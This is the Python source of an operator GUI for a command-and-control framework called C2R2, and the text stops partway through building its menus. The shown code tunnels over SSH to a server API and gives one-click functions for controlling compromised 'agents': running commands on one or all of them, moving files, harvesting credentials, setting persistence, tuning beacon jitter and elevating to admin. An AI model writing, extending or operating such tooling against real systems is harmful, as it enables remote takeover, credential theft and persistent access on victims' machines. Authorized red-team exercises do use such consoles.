#!/usr/bin/env python3
"""
C2R2 Team Client - GUI Interface for C2R2 Server via SSH-Tunneled API

This application provides a graphical interface for operators to connect
to a C2R2 server using SSH tunneling + REST/WebSocket API.

Architecture similar to Havoc C2:
- Server runs on red team infrastructure with a dedicated API port
- Operators connect via SSH from their machines
- SSH tunnel forwards the API port to localhost
- GUI communicates with the API through the encrypted tunnel
- 100% tunneled and secure connection
"""

import os
import sys
import json
import time
import queue
import socket
import threading
import select
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

# Tkinter imports (cross-platform GUI)
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog

# SSH library
try:
    import paramiko
except ImportError:
    print("Error: paramiko is required. Install with: pip install paramiko")
    sys.exit(1)

# HTTP/WebSocket libraries
try:
    import requests
except ImportError:
    print("Error: requests is required. Install with: pip install requests")
    sys.exit(1)

try:
    import websocket
except ImportError:
    print("Error: websocket-client is required. Install with: pip install websocket-client")
    sys.exit(1)


class SSHTunnel:
    """Manages SSH connection and port forwarding to C2R2 server API."""
    
    def __init__(self):
        self.ssh_client: Optional[paramiko.SSHClient] = None
        self.transport: Optional[paramiko.Transport] = None
        self.connected = False
        self.local_port: Optional[int] = None
        self._tunnel_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._tunnel_server: Optional[socket.socket] = None
        self._known_hosts_path = Path.home() / ".ssh" / "known_hosts"
    
    def connect(self, host: str, ssh_port: int, username: str, 
                password: Optional[str] = None, key_path: Optional[str] = None,
                api_port: int = 5555) -> Tuple[bool, str, Optional[int]]:
        """
        Connect to the SSH server and create a tunnel to the API port.
        
        Args:
            host: SSH server hostname/IP
            ssh_port: SSH port (default 22)
            username: SSH username
            password: SSH password (if not using key)
            key_path: Path to SSH private key (if not using password)
            api_port: Remote API port to tunnel (default 5555)
        
        Returns:
            Tuple of (success, message, local_port)
        """
        try:
            self.ssh_client = paramiko.SSHClient()
            
            # Load known hosts
            if self._known_hosts_path.exists():
                self.ssh_client.load_host_keys(str(self._known_hosts_path))
            self.ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
            
            # Connect with either password or key
            connect_params = {
                'hostname': host,
                'port': int(ssh_port),
                'username': username,
                'timeout': 30,
            }
            
            if key_path and os.path.exists(key_path):
                connect_params['key_filename'] = key_path
            elif password:
                connect_params['password'] = password
            else:
                return False, "Either password or SSH key is required", None
            
            self.ssh_client.connect(**connect_params)
            self.transport = self.ssh_client.get_transport()
            
            if not self.transport:
                return False, "Failed to get SSH transport", None
            
            # Find an available local port
            self.local_port = self._find_free_port()
            if not self.local_port:
                return False, "Could not find a free local port", None
            
            # Start the tunnel
            self._stop_event.clear()
            self._tunnel_thread = threading.Thread(
                target=self._run_tunnel,
                args=(host, api_port, self.local_port),
                daemon=True
            )
            self._tunnel_thread.start()
            
            # Wait a bit for the tunnel to be ready
            time.sleep(0.5)
            
            self.connected = True
            return True, f"SSH tunnel established: localhost:{self.local_port} -> {host}:{api_port}", self.local_port
            
        except paramiko.AuthenticationException:
            return False, "Authentication failed. Check username/password/key.", None
        except paramiko.SSHException as e:
            return False, f"SSH error: {str(e)}", None
        except socket.error as e:
            return False, f"Connection error: {str(e)}", None
        except Exception as e:
            return False, f"Error: {str(e)}", None
    
    def _find_free_port(self) -> Optional[int]:
        """Find a free local port for the tunnel."""
        for port in range(10000, 11000):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind(('127.0.0.1', port))
                sock.close()
                return port
            except OSError:
                continue
        return None
    
    def _run_tunnel(self, remote_host: str, remote_port: int, local_port: int):
        """Run the SSH tunnel (port forward)."""
        try:
            # Create a local server socket
            self._tunnel_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._tunnel_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._tunnel_server.bind(('127.0.0.1', local_port))
            self._tunnel_server.listen(5)
            self._tunnel_server.setblocking(False)
            
            connections = []
            
            while not self._stop_event.is_set():
                # Check for new connections
                try:
                    readable, _, _ = select.select([self._tunnel_server], [], [], 0.1)
                    if self._tunnel_server in readable:
                        client_socket, _ = self._tunnel_server.accept()
                        client_socket.setblocking(False)
                        
                        # Open a channel through SSH to the remote port
                        try:
                            channel = self.transport.open_channel(
                                'direct-tcpip',
                                ('127.0.0.1', remote_port),
                                client_socket.getpeername()
                            )
                            if channel:
                                connections.append((client_socket, channel))
                            else:
                                client_socket.close()
                        except Exception:
                            client_socket.close()
                except Exception:
                    pass
                
                # Handle existing connections
                to_remove = []
                for client_socket, channel in connections:
                    try:
                        # Forward data from client to channel
                        readable, _, _ = select.select([client_socket], [], [], 0)
                        if client_socket in readable:
                            data = client_socket.recv(4096)
                            if data:
                                channel.send(data)
                            else:
                                to_remove.append((client_socket, channel))
                                continue
                        
                        # Forward data from channel to client
                        if channel.recv_ready():
                            data = channel.recv(4096)
                            if data:
                                client_socket.send(data)
                            else:
                                to_remove.append((client_socket, channel))
                                
                    except Exception:
                        to_remove.append((client_socket, channel))
                
                # Clean up closed connections
                for item in to_remove:
                    connections.remove(item)
                    try:
                        item[0].close()
                        item[1].close()
                    except Exception:
                        pass
                        
        except Exception as e:
            print(f"Tunnel error: {e}")
        finally:
            if self._tunnel_server:
                self._tunnel_server.close()
    
    def disconnect(self):
        """Disconnect SSH and close tunnel."""
        self._stop_event.set()
        
        if self._tunnel_thread:
            self._tunnel_thread.join(timeout=2)
        
        if self._tunnel_server:
            try:
                self._tunnel_server.close()
            except Exception:
                pass
        
        if self.ssh_client:
            try:
                self.ssh_client.close()
            except Exception:
                pass
        
        self.connected = False
        self.local_port = None
        self.ssh_client = None
        self.transport = None


class C2R2ApiClient:
    """HTTP/WebSocket client for communicating with C2R2 server API through SSH tunnel."""
    
    def __init__(self):
        self.base_url: Optional[str] = None
        self.ws_url: Optional[str] = None
        self.token: Optional[str] = None
        self.ws: Optional[websocket.WebSocketApp] = None
        self.connected = False
        self.on_event: Optional[callable] = None
        self._ws_thread: Optional[threading.Thread] = None
        self._running = False
    
    def connect(self, host: str, port: int, password: str, username: str = "operator") -> Tuple[bool, str]:
        """
        Connect to the C2R2 server API (through local tunnel port).
        
        Args:
            host: Local tunnel host (usually 127.0.0.1)
            port: Local tunnel port
            password: API password
            username: Username for login
        
        Returns:
            Tuple of (success, message)
        """
        self.base_url = f"http://{host}:{port}"
        self.ws_url = f"ws://{host}:{port}/api/events"
        
        try:
            # Login and get token
            response = requests.post(
                f"{self.base_url}/api/auth/login",
                json={"username": username, "password": password},
                timeout=10
            )
            
            if response.status_code != 200:
                return False, f"Login failed: HTTP {response.status_code}"
            
            data = response.json()
            if not data.get("success"):
                return False, data.get("message", "Login failed")
            
            self.token = data.get("token")
            if not self.token:
                return False, "No token received"
            
            self.connected = True
            return True, f"Connected as {username}"
            
        except requests.exceptions.ConnectionError:
            return False, f"Connection failed: Cannot connect to {host}:{port}"
        except requests.exceptions.Timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def start_event_listener(self, on_event: callable):
        """Start WebSocket connection for real-time events."""
        if not self.token:
            return
        
        self.on_event = on_event
        self._running = True
        
        def on_message(ws, message):
            try:
                event = json.loads(message)
                if self.on_event:
                    self.on_event(event)
            except json.JSONDecodeError:
                pass
        
        def on_error(ws, error):
            if self._running:
                print(f"WebSocket error: {error}")
        
        def on_close(ws, close_status_code, close_msg):
            if self._running:
                print(f"WebSocket closed: {close_status_code} - {close_msg}")
        
        def on_open(ws):
            print("WebSocket connected")
        
        self.ws = websocket.WebSocketApp(
            self.ws_url,
            header={"Authorization": f"Bearer {self.token}"},
            on_message=on_message,
            on_error=on_error,
            on_close=on_close,
            on_open=on_open
        )
        
        self._ws_thread = threading.Thread(target=self.ws.run_forever, daemon=True)
        self._ws_thread.start()
    
    def stop_event_listener(self):
        """Stop WebSocket connection."""
        self._running = False
        if self.ws:
            self.ws.close()
    
    def _headers(self) -> Dict[str, str]:
        """Get headers with auth token."""
        return {"Authorization": f"Bearer {self.token}"}
    
    def get_agents(self) -> tuple[bool, Any]:
        """Get list of connected agents."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.get(
                f"{self.base_url}/api/agents",
                headers=self._headers(),
                timeout=10
            )
            
            if response.status_code == 401:
                return False, "Authentication failed"
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            data = response.json()
            return data.get("success", False), data.get("data", {})
            
        except Exception as e:
            return False, str(e)
    
    def get_agent(self, agent_id: int) -> tuple[bool, Any]:
        """Get specific agent info."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.get(
                f"{self.base_url}/api/agents/{agent_id}",
                headers=self._headers(),
                timeout=10
            )
            
            if response.status_code == 404:
                return False, "Agent not found"
            if response.status_code == 401:
                return False, "Authentication failed"
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            data = response.json()
            return data.get("success", False), data.get("data", {})
            
        except Exception as e:
            return False, str(e)
    
    def send_command(self, agent_id: int, command: str) -> tuple[bool, str]:
        """Send command to an agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/cmd",
                headers=self._headers(),
                json={"command": command},
                timeout=30
            )
            
            if response.status_code == 401:
                return False, "Authentication failed"
            if response.status_code == 404:
                return False, "Agent not found"
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def send_command_all(self, command: str) -> tuple[bool, Any]:
        """Send command to all agents."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/all/cmd",
                headers=self._headers(),
                json={"command": command},
                timeout=30
            )
            
            if response.status_code == 401:
                return False, "Authentication failed"
            
            data = response.json()
            return data.get("success", False), data.get("data", [])
            
        except Exception as e:
            return False, str(e)
    
    def download_file(self, agent_id: int, remote_path: str) -> tuple[bool, str]:
        """Request file download from agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/download",
                headers=self._headers(),
                json={"remote_path": remote_path},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def upload_file(self, agent_id: int, local_path: str, remote_path: str) -> tuple[bool, str]:
        """Upload a file to an agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            # Read and encode file
            import base64
            with open(local_path, 'rb') as f:
                file_data = f.read()
            data_base64 = base64.b64encode(file_data).decode('utf-8')
            
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/upload",
                headers=self._headers(),
                json={"local_data_base64": data_base64, "remote_path": remote_path},
                timeout=60
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except FileNotFoundError:
            return False, "Local file not found"
        except Exception as e:
            return False, str(e)
    
    def list_directory(self, agent_id: int, path: str) -> tuple[bool, str]:
        """List directory contents on agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/listdir",
                headers=self._headers(),
                json={"path": path},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def change_directory(self, agent_id: int, path: str) -> tuple[bool, str]:
        """Change current directory on agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/cd",
                headers=self._headers(),
                json={"path": path},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def get_pwd(self, agent_id: int) -> tuple[bool, str]:
        """Get current working directory of agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/pwd",
                headers=self._headers(),
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def harvest_credentials(self, agent_id: int) -> tuple[bool, str]:
        """Trigger credential harvesting on agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/harvest",
                headers=self._headers(),
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def set_persistence(self, agent_id: int, method: str) -> tuple[bool, str]:
        """Set persistence on agent."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/persist",
                headers=self._headers(),
                json={"method": method},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def configure_beacon(self, agent_id: int, interval: int, jitter: int) -> tuple[bool, str]:
        """Configure beacon timing."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/beacon",
                headers=self._headers(),
                json={"interval": interval, "jitter": jitter},
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def elevate_agent(self, agent_id: int) -> tuple[bool, str]:
        """Elevate agent to admin."""
        if not self.connected:
            return False, "Not connected"
        
        try:
            response = requests.post(
                f"{self.base_url}/api/agents/{agent_id}/elevate",
                headers=self._headers(),
                timeout=30
            )
            
            data = response.json()
            return data.get("success", False), data.get("message", "Unknown error")
            
        except Exception as e:
            return False, str(e)
    
    def get_server_status(self) -> tuple[bool, Any]:
        """Get server status."""
        if not self.base_url:
            return False, "Not connected"
        
        try:
            response = requests.get(
                f"{self.base_url}/api/status",
                timeout=10
            )
            
            if response.status_code != 200:
                return False, f"HTTP {response.status_code}"
            
            return True, response.json()
            
        except Exception as e:
            return False, str(e)
    
    def disconnect(self):
        """Disconnect from the server."""
        self.stop_event_listener()
        
        if self.connected and self.token:
            try:
                requests.post(
                    f"{self.base_url}/api/auth/logout",
                    headers=self._headers(),
                    timeout=5
                )
            except Exception:
                pass
        
        self.connected = False
        self.token = None
        self.base_url = None
        self.ws_url = None


class C2R2TeamClient:
    """Main GUI application for C2R2 Team Client."""
    
    def __init__(self):
        # Setup logging
        self._setup_logging()
        self.logger = logging.getLogger('C2R2TeamClient')
        self.logger.info("="*60)
        self.logger.info("C2R2 Team Client Starting")
        self.logger.info("="*60)
        
        # Load configuration
        self.config_file = Path.home() / ".c2r2" / "team_client_config.json"
        self.config = self._load_config()
        self.logger.debug(f"Config file: {self.config_file}")
        
        self.root = tk.Tk()
        self.root.title("C2R2 Team Client")
        self.root.geometry("1200x800")
        self.root.minsize(800, 600)
        
        self.logger.debug("Tkinter window initialized")
        
        # Set icon if available
        try:
            if sys.platform == 'win32':
                self.root.iconbitmap(default='')
        except Exception:
            pass
        
        # Matrix/Hacker theme colors - Neon green on black
        self.colors = {
            'bg': '#000000',           # Pure black background
            'fg': '#00FF41',           # Neon green text (Matrix green)
            'accent': '#39FF14',       # Bright neon green accent
            'accent_hover': '#00FF00', # Pure green hover
            'panel_bg': '#0a0a0a',     # Very dark gray panels
            'input_bg': '#0d0d0d',     # Slightly lighter for inputs
            'success': '#00FF41',      # Matrix green for success
            'warning': '#FFFF00',      # Yellow for warnings
            'error': '#FF0000',        # Red for errors
            'info': '#00FFFF',         # Cyan for info
            'border': '#00FF41',       # Neon green borders
            'grid': '#003300',         # Dark green for grid lines
        }
        
        # Configure root
        self.root.configure(bg=self.colors['bg'])
        
        # Initialize SSH tunnel and API client
        self.ssh_tunnel = SSHTunnel()
        self.api = C2R2ApiClient()
        self.event_queue = queue.Queue()
        self.running = True
        self.selected_client = None
        self.agents: Dict[int, dict] = {}  # Dictionary to store connected agents
        self._agent_tree_items: Dict[int, str] = {}  # Mapping of agent_id to tree item
        self.file_explorer_windows: Dict[int, tk.Toplevel] = {}  # File explorer windows
        self.file_explorer_data: Dict[int, dict] = {}  # File explorer tree views and vars
        
        # Create UI
        self._setup_styles()
        self._create_menu()
        self._create_login_frame()
        self._create_main_frame()
        
        # Start with login frame visible
        self.main_frame.pack_forget()
        self.login_frame.pack(fill=tk.BOTH, expand=True)
        
        # Start event processor
        self.root.after(100, self._process_event_queue)
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
    
    def _setup_logging(self):
        """Configure logging for debug output."""
        # Create logs directory
        log_dir = Path.home() / ".c2r2" / "logs"
        log_dir.mkdir(parents=True, exist_ok=True)
        
        # Create log file with timestamp
        log_file = log_dir / f"team_client_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        # Configure logging
        logging.basicConfig(
            level=logging.DEBUG,
            format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        print(f"[DEBUG] Logging to: {log_file}")
    
    def _load_config(self) -> dict:
        """Load saved configuration."""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self.logger.info(f"Loaded configuration from {self.config_file}")
                    return config
            except Exception as e:
                self.logger.error(f"Failed to load config: {e}")
        return {}
    
    def _save_config(self):
        """Save current configuration."""
        try:
            self.config_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            self.logger.info(f"Configuration saved to {self.config_file}")
        except Exception as e:
            self.logger.error(f"Failed to save config: {e}")
    
    def _setup_styles(self):
        """Configure ttk styles for dark theme."""
        style = ttk.Style()
        
        # Try to use a theme that works well with dark colors
        try:
            style.theme_use('clam')
        except Exception:
            pass
        
        # Configure styles
        style.configure('Dark.TFrame', background=self.colors['bg'])
        style.configure('Panel.TFrame', background=self.colors['panel_bg'])
        style.configure('Dark.TLabel', 
                       background=self.colors['bg'], 
                       foreground=self.colors['fg'])
        style.configure('Panel.TLabel',
                       background=self.colors['panel_bg'],
                       foreground=self.colors['fg'])
        style.configure('Header.TLabel',
                       background=self.colors['bg'],
                       foreground=self.colors['accent'],
                       font=('Consolas', 14, 'bold'))
        style.configure('Dark.TButton',
                       background=self.colors['accent'],
                       foreground='white')
        style.configure('Dark.TEntry',
                       fieldbackground=self.colors['input_bg'],
                       foreground=self.colors['fg'])
        
        # Treeview style
        style.configure('Dark.Treeview',
                       background=self.colors['panel_bg'],
                       foreground=self.colors['fg'],
                       fieldbackground=self.colors['panel_bg'],
                       rowheight=25)
        style.configure('Dark.Treeview.Heading',
                       background=self.colors['bg'],
                       foreground=self.colors['fg'],
                       font=('Consolas', 10, 'bold'))
        style.map('Dark.Treeview',
                 background=[('selected', self.colors['accent'])],
                 foreground=[('selected', 'white')])
    
    def _create_menu(self):
        """Create the menu bar."""
        menubar = tk.Menu(self.root, bg=self.colors['bg'], fg=self.colors['fg'])
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0, bg=self.colors['bg'], fg=self.colors['fg'])
        file_menu.add_command(label="Disconnect", command=self._disconnect)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self._on_close)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0, bg=self.colors['bg'], fg=self.colors['fg'])
        help_menu.add_command(label="About", command=self._show_about)
        help_menu.add_command(label="Commands Help", command=self._show_commands_help)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.root.config(menu=menubar)
    
    def _create_login_frame(self):
        """Create the login/connection frame."""
        self.login_frame = ttk.Frame(self.root, style='Dark.TFrame')
        
        # Center container
        center_frame = ttk.Frame(self.login_frame, style='Dark.TFrame')
        center_frame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
        
        # Title
        title_label = ttk.Label(
            center_frame, 
            text="🔐 C2R2 Team Client", 
            style='Header.TLabel',
            font=('Consolas', 24, 'bold')
        )
        title_label.pack(pady=(0, 30))
        
        subtitle = ttk.Label(
            center_frame,
            text="Connect to C2R2 Server via SSH Tunnel",
            style='Dark.TLabel',
            font=('Consolas', 12)
        )
        subtitle.pack(pady=(0, 20))
        
        # Connection form
        form_frame = ttk.Frame(center_frame, style='Panel.TFrame', padding=30)
        form_frame.pack(padx=20, pady=10)
        
        # SSH Section Header
        row = 0
        ttk.Label(form_frame, text="─── SSH Connection ───", style='Panel.TLabel',
                  font=('Consolas', 10, 'bold')).grid(row=row, column=0, columnspan=2, pady=(0, 10))
        
        # SSH Host
        row += 1
        ttk.Label(form_frame, text="SSH Host:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.ssh_host_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.ssh_host_entry.grid(row=row, column=1, padx=5, pady=5)
        saved_ssh_host = self.config.get('ssh_host', '')
        self.ssh_host_entry.insert(0, saved_ssh_host)
        self.logger.debug(f"Loaded saved SSH host: {saved_ssh_host}")
        
        # SSH Port
        row += 1
        ttk.Label(form_frame, text="SSH Port:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.ssh_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.ssh_port_entry.grid(row=row, column=1, padx=5, pady=5)
        self.ssh_port_entry.insert(0, self.config.get('ssh_port', '22'))
        
        # SSH Username
        row += 1
        ttk.Label(form_frame, text="SSH User:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.ssh_user_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.ssh_user_entry.grid(row=row, column=1, padx=5, pady=5)
        self.ssh_user_entry.insert(0, self.config.get('ssh_user', ''))
        
        # SSH Password
        row += 1
        ttk.Label(form_frame, text="SSH Password:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.ssh_password_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry', show='*')
        self.ssh_password_entry.grid(row=row, column=1, padx=5, pady=5)
        
        # SSH Key (optional)
        row += 1
        ttk.Label(form_frame, text="SSH Key (optional):", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        key_frame = ttk.Frame(form_frame, style='Panel.TFrame')
        key_frame.grid(row=row, column=1, padx=5, pady=5, sticky='w')
        self.ssh_key_entry = ttk.Entry(key_frame, width=32, style='Dark.TEntry')
        self.ssh_key_entry.pack(side=tk.LEFT)
        self.ssh_key_entry.insert(0, self.config.get('ssh_key', ''))
        browse_btn = tk.Button(key_frame, text="Browse", bg=self.colors['panel_bg'], 
                               fg=self.colors['fg'], relief=tk.FLAT,
                               command=self._browse_ssh_key)
        browse_btn.pack(side=tk.LEFT, padx=5)
        
        # API Section Header
        row += 1
        ttk.Label(form_frame, text="─── C2R2 API ───", style='Panel.TLabel',
                  font=('Consolas', 10, 'bold')).grid(row=row, column=0, columnspan=2, pady=(15, 10))
        
        # Remote API Port
        row += 1
        ttk.Label(form_frame, text="Remote API Port:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.api_port_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.api_port_entry.grid(row=row, column=1, padx=5, pady=5)
        self.api_port_entry.insert(0, self.config.get('api_port', '5555'))
        
        # Operator Username
        row += 1
        ttk.Label(form_frame, text="Operator Name:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.username_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry')
        self.username_entry.grid(row=row, column=1, padx=5, pady=5)
        self.username_entry.insert(0, self.config.get('username', 'operator'))
        
        # API Password
        row += 1
        ttk.Label(form_frame, text="API Password:", style='Panel.TLabel').grid(
            row=row, column=0, sticky='e', padx=5, pady=5)
        self.password_entry = ttk.Entry(form_frame, width=40, style='Dark.TEntry', show='*')
        self.password_entry.grid(row=row, column=1, padx=5, pady=5)
        self.password_entry.insert(0, "c2r2-secret")
        
        row += 1
        hint_label = ttk.Label(
            form_frame, 
            text="(API password set on server with --api-password flag)",
            style='Panel.TLabel',
            font=('Consolas', 9)
        )
        hint_label.grid(row=row, column=1, sticky='w', padx=5)
        
        # Save credentials checkbox
        row += 1
        self.save_credentials_var = tk.BooleanVar(value=self.config.get('save_credentials', False))
        save_check = tk.Checkbutton(
            form_frame,
            text="💾 Save connection information (credentials NOT stored)",
            variable=self.save_credentials_var,
            bg=self.colors['panel_bg'],
            fg=self.colors['fg'],
            selectcolor=self.colors['input_bg'],
            activebackground=self.colors['panel_bg'],
            activeforeground=self.colors['accent'],
            font=('Consolas', 9)
        )
        save_check.grid(row=row, column=0, columnspan=2, pady=10)
        
        # Connect button
        row += 1
        self.connect_btn = tk.Button(
            form_frame,
            text="🔗 Connect via SSH Tunnel",
            font=('Consolas', 12, 'bold'),
            bg=self.colors['accent'],
            fg='white',
            activebackground=self.colors['accent_hover'],
            activeforeground='white',
            cursor='hand2',
            relief=tk.FLAT,
            padx=30,
            pady=10,
            command=self._connect
        )
        self.connect_btn.grid(row=row, column=0, columnspan=2, pady=20)
        
        # Status label
        row += 1
        self.login_status = ttk.Label(form_frame, text="", style='Panel.TLabel')
        self.login_status.grid(row=row, column=0, columnspan=2)
    
    def _browse_ssh_key(self):
        """Open file dialog to select SSH private key."""
        initial_dir = Path.home() / ".ssh"
        if not initial_dir.exists():
            initial_dir = Path.home()
        
        filepath = filedialog.askopenfilename(
            title="Select SSH Private Key",
            initialdir=str(initial_dir),
            filetypes=[("All Files", "*"), ("PEM Files", "*.pem")]
        )
        if filepath:
            self.ssh_key_entry.delete(0, tk.END)
            self.ssh_key_entry.insert(0, filepath)
    
    def _create_main_frame(self):
        """Create the main application frame (shown after connection)."""
        self.main_frame = ttk.Frame(self.root, style='Dark.TFrame')
        
        # Top bar with connection info
        top_bar = ttk.Frame(self.main_frame, style='Panel.TFrame')
        top_bar.pack(fill=tk.X, padx=5, pady=5)
        
        self.connection_label = ttk.Label(
            top_bar,
            text="🔐 Not Connected",
            style='Panel.TLabel',
            font=('Consolas', 10, 'bold')
        )
        self.connection_label.pack(side=tk.LEFT, padx=10)
        
        disconnect_btn = tk.Button(
            top_bar,
            text="Disconnect",
            bg=self.colors['error'],
            fg='white',
            relief=tk.FLAT,
            command=self._disconnect
        )
        disconnect_btn.pack(side=tk.RIGHT, padx=10)
        
        # Main paned window
        main_paned = ttk.PanedWindow(self.main_frame, orient=tk.HORIZONTAL)
        main_paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left panel - Agents list
        left_panel = ttk.Frame(main_paned, style='Panel.TFrame')
        main_paned.add(left_panel, weight=1)
        
        # Store file explorer windows
        self.file_explorer_windows: Dict[int, tk.Toplevel] = {}
        
        # Agents header
        agents_header = ttk.Frame(left_panel, style='Panel.TFrame')
        agents_header.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(
            agents_header,
            text="🖥️ Connected Agents",
            style='Panel.TLabel',
            font=('Consolas', 12, 'bold')
        ).pack(side=tk.LEFT)
        
        refresh_btn = tk.Button(
            agents_header,
            text="🔄",
            bg=self.colors['info'],
            fg='white',
            relief=tk.FLAT,
            command=self._refresh_agents
        )
        refresh_btn.pack(side=tk.RIGHT)
        
        # Agents treeview
        tree_frame = ttk.Frame(left_panel, style='Panel.TFrame')
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('ID', 'Host', 'User', 'OS', 'Privileges')
        self.agents_tree = ttk.Treeview(
            tree_frame,
            columns=columns,
            show='headings',
            style='Dark.Treeview'
        )
        
        for col in columns:
            self.agents_tree.heading(col, text=col)
            self.agents_tree.column(col, width=80)
        
        self.agents_tree.column('ID', width=40)
        self.agents_tree.column('Host', width=120)
        self.agents_tree.column('User', width=100)
        self.agents_tree.column('OS', width=150)
        self.agents_tree.column('Privileges', width=80)
        
        # Configure tag for admin privileges (red and bold)
        self.agents_tree.tag_configure('admin', foreground='#FF0000', font=('Consolas', 10, 'bold'))
        
        scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.agents_tree.yview)
        self.agents_tree.configure(yscrollcommand=scrollbar.set)
        
        self.agents_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.agents_tree.bind('<<TreeviewSelect>>', self._on_agent_select)
        self.agents_tree.bind('<Double-1>', self._on_agent_double_click)
        self.agents_tree.bind('<Button-3>', self._show_agent_context_menu)  # Right-click
        
        # Create context menu for agents
        self.agent_context_menu = tk.Menu(self.root, tearoff=0, bg=self.colors['panel_bg'], 
                                          fg=self.colors['fg'], activebackground=self.colors['accent'],
                                          activeforeground='white')
        self.agent_context_menu.add_command(label="📋 Select Agent", command=self._context_select_agent)
        self.agent_context_menu.add_command(label="ℹ️ Show Info", command=self._context_show_info)
        self.agent_context_menu.add_separator()
        self.agent_context_menu.add_command(label="💻 Execute Command...", command=self._context_execute_command)
        self.agent_context_menu.add_command(label="📂 File Explorer", command=self._context_file_explorer)
        self.agent_context_menu.add_command(label="📥 Download File...", command=self._context_download_file)
        self.agent_context_menu.add_command(label="📤 Upload File...", command=self._context_upload_file)
        self.agent_context_menu.add_separator()
        self.agent_context_menu.add_command(label="🔑 Harvest Credentials", command=self._context_harvest)
        self.agent_context_menu.add_command(label="📌 Set Persistence...", command=self._context_persistence)
        self.agent_context_menu.add_command(label="📡 Configure Beacon...", command=self._context_beacon)
        self.agent_context_menu.add_command(label="⬆️ Elevate to Admin", command=self._context_elevate)
        self.agent_context_menu.add_separator()
